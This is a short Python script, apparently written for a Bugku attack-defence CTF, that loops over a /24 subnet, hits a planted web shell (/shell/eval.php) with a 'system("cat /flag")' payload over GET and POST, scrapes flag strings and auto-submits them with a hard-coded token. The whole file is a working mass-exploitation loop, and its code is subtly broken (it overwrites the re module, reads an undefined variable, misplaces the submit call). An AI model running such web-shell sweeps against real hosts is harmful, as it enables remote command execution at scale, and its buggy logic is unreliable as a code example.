import requests
import re

list = []

def shellGET():

	for i in range(1,255):
		try:
			re = requests.get("http://10.201.64." + str(i) + "/shell/eval.php?pass=system('cat /flag')")
			# list.append(io.text[0:38])
			list.append(re.search("flag{.*}", io.text).group(0)[:50])
		except:
			print('no')
	print(list)

def shellPOST():

	for j in range(1,255):
		url = "http://10.201.64." + str(j) + "/shell/eval.php"

		data = {

			'pass':'system("cat /flag");'
		}

		try:
			re = requests.post(url=url, data=data, timeout=1)
			# list.append(io.text[0:38])
			list.append(re.search("flag{.*}", io.text).group(0)[:50])
		except:
			print('no')
	print(list)

while 1:
    # shellGET()
	shellPOST()

	for k in list:

		url = "https://ctf.bugku.com/awd/submit.html/"
		flag = k

		data = {
			'flag':flag,
			'token':'810d69e8d3916d8cf04ffd8bcd9fdfba',
			'event_hash':'397ab754-3cal-4a5a-a141-53e823a3ac48.event'
		}
	r = requests.post(url=url, data=data)
	rq =r.text
	print(rq)

'''
while 1:
     shellGET()
    # shellPOST()

    for k in list:
        io = requests.get("https://ctf.bugku.com/awd/submit.html?token=810d69e8d3916d8cf04ffd8bcd9fdfba&flag=" + str(k))
    # token 根据场景更改
'''